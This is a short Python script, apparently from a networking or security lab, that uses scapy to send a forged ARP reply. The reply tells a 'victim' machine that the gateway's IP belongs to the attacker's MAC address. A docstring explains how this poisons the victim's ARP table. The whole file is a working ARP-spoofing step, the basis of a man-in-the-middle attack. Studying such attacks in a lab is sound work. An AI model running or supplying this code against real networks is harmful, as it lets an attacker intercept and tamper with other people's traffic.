import scapy.all as scapy

# Replace the MAC address with the victim's actual MAC address
victim_ip = "10.0.2.15"
victim_mac = "08:00:27:08:af:07"
gateway_ip = "10.0.2.2"

packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
scapy.send(packet)
"""
When this ARP reply is sent to the victim's machine (10.0.2.15), the following happens:

The victim receives an ARP reply stating that the IP address 10.0.2.2 (the gateway) is associated with the MAC address of the attacker (which is the source MAC address of the Ethernet frame containing the ARP packet).
The victim updates its ARP table to map 10.0.2.2 to the attacker's MAC address.
Implicit Attacker MAC Address
Although not explicitly stated in the ARP packet, the source MAC address of the Ethernet frame (which is created automatically by the network stack of the attacker's machine) is the attacker's MAC address. Thus, the victim's machine will think that the IP 10.0.2.2 is at the MAC address of the attacker's machine.
"""